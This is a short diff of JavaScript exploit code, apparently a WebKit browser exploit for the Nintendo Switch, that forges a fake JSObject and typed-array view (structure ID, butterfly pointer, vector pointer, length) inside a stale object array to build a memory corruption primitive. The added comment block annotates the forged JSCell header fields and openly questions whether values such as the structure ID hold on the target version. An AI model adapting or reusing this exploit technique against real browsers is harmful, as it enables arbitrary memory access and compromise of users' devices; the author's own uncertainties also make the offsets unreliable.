@@ -166,10 +166,26 @@ for (var i = 0; i < 0x1000; i++){
 				structID = 100;
 				stale[0] = {
 				    'a': u2d(structID, 0), // the JSObject properties
-				    'b': u2d(0, 0),
+				    'b': {}, //u2d(0, 0), // Butterfly ptr
 				    'c': smsh, // var smsh = new Uint32Array(0x10)
 				    'd': u2d(0x100, 0)
 				}
+				/*
+				stale[0] = {
+					// 'a' is the forged JSCell header
+					// m_structureID = 105 // Struct ID for Uint32ArrayType (Changes on runtime, how did this work?)
+					// m_indexingType = 0x0
+					// m_type = 0x26 // Assumingly Uint32ArrayType on the version of webkit this was made on.
+					// m_flags = 0x72
+					// m_gcData (or m_cellState?) = 0x11
+ 					'a': u2d(105, 0x1172600),
+					
+					// 'b' - 'd' are the forged JSArrayBufferView
+ 					'b': u2d(0, 0),		// butterfly ptr (Does this exist on the version of wk the switch is using?)
+ 					'c': smsh,		// void* m_vector
+ 					'd': u2d(0x100, 0)	// uint32_t m_length;
+ 				}
+				*/
 				
 				stale[1] = stale[0];
 				bufs[i][k] += 0x10;
